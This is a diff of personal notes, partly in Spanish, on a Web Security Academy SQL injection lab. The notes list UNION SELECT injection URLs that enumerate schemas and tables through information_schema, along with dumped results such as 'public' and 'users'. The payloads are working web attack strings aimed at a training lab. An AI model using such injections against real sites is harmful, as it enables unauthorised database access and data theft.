@@ -78,6 +78,7 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',schema_name FROM information_schema.schemata -- -
 ## Opt2 - Dump: schema_name = DBs
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT schema_name,'2' FROM information_schema.schemata -- -
+    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
     ### [DUMP = DB = 1. pg_catalog]
     ### [DUMP = DB = 2. public]
 
@@ -86,9 +87,16 @@ https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  
 ## Opt2 - Dump: table_name = Tables (TODAS)
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT table_name,'2' FROM information_schema.tables -- -
 ## Opt3 - Dump: table_name = Tables (SOLO database() en este caso 'public')
-https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT  '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
+https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT '1',table_name FROM information_schema.tables WHERE table_schema = 'public' -- -
 ## Opt4 - Dump: table_name = Tables (SOLO database() en este caso 'public')
 https://666.web-security-academy.net/filter?category=Accessories' UNION SELECT table_name,'2' FROM information_schema.tables WHERE table_schema = 'public' -- -
+    ### vvv-vvv-vvv-vvv-vvv-vvv-vvv
+    ### [DUMP = Table = 1. users]
+    ### [DUMP = Table = 2. products]
+
+
+
+
 ````
 
 
